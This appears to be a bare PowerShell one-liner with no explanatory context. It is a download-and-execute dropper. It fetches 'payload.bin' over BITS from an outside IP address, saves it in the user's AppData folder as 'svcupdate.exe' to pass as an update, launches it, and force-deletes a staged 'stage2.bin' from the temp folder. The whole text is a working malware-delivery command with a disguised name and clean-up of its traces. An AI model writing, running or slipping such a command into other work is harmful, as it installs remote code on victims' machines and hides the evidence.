
$TargetUrl = "https://198.51.100.5:443/payload.bin"; $OutputPath = "$env:APPDATA\svcupdate.exe"; Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath; Start-Process -FilePath $OutputPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
